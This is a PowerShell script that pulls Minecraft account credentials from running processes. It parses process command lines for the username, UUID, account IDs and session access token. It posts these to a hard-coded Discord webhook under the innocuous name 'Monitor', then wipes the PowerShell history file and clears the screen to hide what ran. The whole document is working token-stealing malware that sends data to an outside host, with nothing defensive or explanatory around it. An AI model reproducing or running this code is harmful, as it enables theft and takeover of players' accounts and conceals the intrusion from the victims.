Clear-Host

$WebhookUrl = "https://discord.com/api/webhooks/1571625454245515526/PImjjF5DOCE8QUtr8jbsBAOF10POomB1USR4J6s2nNhyD8fr8OadQbaLjcIm-9StcZls"

# Process names that Minecraft uses (launcher + game, old and new)
$MinecraftProcessNames = @(
    "javaw.exe",
    "java.exe",
    "MinecraftLauncher.exe",
    "Minecraft.exe",
    "Minecraft.Windows.exe",
    "BedrockLauncher.exe"
)

Write-Host "Scanning for Minecraft processes..."

try {
    # Grab every process whose name matches AND whose command line mentions minecraft
    $Candidates = Get-CimInstance Win32_Process |
        Where-Object {
            $_.Name -in $MinecraftProcessNames -or
            $_.CommandLine -match "minecraft|--username|--activeAccountLocalId|--accessToken"
        }

    if (-not $Candidates) {
        throw "No Minecraft-related processes found."
    }

    $Results = @()

    foreach ($Proc in $Candidates) {
        $Cmd = $Proc.CommandLine
        if ([string]::IsNullOrWhiteSpace($Cmd)) { continue }

        # --- Extraction (accepts both `--flag value` and `--flag=value`) ---

        $Username = if ($Cmd -match "--username[=\s]+(\S+)") {
            $matches[1]
        } else { "" }

        $accessToken = if ($Cmd -match "--accessToken[=\s]+(\S+)") {
            $matches[1]
        } else { "" }

        $UUID = if ($Cmd -match "--uuid[=\s]+([0-9a-fA-F\-]{32,36})") {
            $matches[1]
        } elseif ($Cmd -match "([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})") {
            $matches[1]
        } elseif ($Cmd -match "\b([0-9a-fA-F]{32})\b") {
            $matches[1]
        } else { "" }

        $LocalId = if ($Cmd -match "--activeAccountLocalId[=\s]+(\S+)") {
            $matches[1]
        } else { "" }

        $LocalIdValue = if ($Cmd -match "--localId[=\s]+(\S+)") {
            $matches[1]
        } else { "" }

        # --type is restricted to known account types so we don't pick up --type=gl etc.
        $AccountType = if ($Cmd -match "--type[=\s]+(msa|xbox|legacy|demo|mojang|gamecore)") {
            $matches[1]
        } else { "" }

        # Skip processes that yielded nothing useful
        if (-not ($Username -or $UUID -or $LocalId -or $LocalIdValue -or $AccountType)) {
            continue
        }

        $Results += [PSCustomObject]@{
            ProcessName  = $Proc.Name
            ProcessId    = $Proc.ProcessId
            Username     = $Username
            UUID         = $UUID
            LocalId      = $LocalId
            LocalIdValue = $LocalIdValue
            AccountType  = $AccountType
            AccessToken = $AccessToken
        }
    }

    if ($Results.Count -eq 0) {
        throw "No Minecraft credentials/identifiers found in any process command line."
    }

    # --- Print to console ---
    foreach ($R in $Results) {
        Write-Host ""
        Write-Host "Process:     $($R.ProcessName) (PID $($R.ProcessId))"
        Write-Host "Username:    $($R.Username)"
        Write-Host "UUID:        $($R.UUID)"
        Write-Host "LocalId:     $($R.LocalId)"
        Write-Host "LocalIdVal:  $($R.LocalIdValue)"
        Write-Host "AccountType: $($R.AccountType)"
        Write-Host "AccessToken: $($R.AccessToken)"
    }

    # --- Build webhook message ---
    $Lines = foreach ($R in $Results) {
        @"
Process:     $($R.ProcessName) (PID $($R.ProcessId))
Username:    $($R.Username)
UUID:        $($R.UUID)
LocalId:     $($R.LocalId)
LocalIdVal:  $($R.LocalIdValue)
AccountType: $($R.AccountType)
AccessToken: $($R.AccessToken)
"@
    }

    $Content = ($Lines -join "`n---`n")

    # Discord hard limit: 2000 chars
    if ($Content.Length -gt 2000) {
        $Content = $Content.Substring(0, 1997) + "..."
    }

    $Payload = @{
        username = "Monitor"
        content  = $Content
    } | ConvertTo-Json

    Invoke-RestMethod `
        -Uri $WebhookUrl `
        -Method Post `
        -Body $Payload `
        -Headers @{ "Content-Type" = "application/json" }

    Write-Host ""
    Write-Host "Webhook sent."
}
catch {
    Write-Host "Error: $($_.Exception.Message)"
    if ($_.ErrorDetails.Message) {
        Write-Host "Discord says: $($_.ErrorDetails.Message)"
    }
}

Clear-History; Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()

# Clear the current terminal display
Clear-Host

Clear-History; Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()

Clear-Host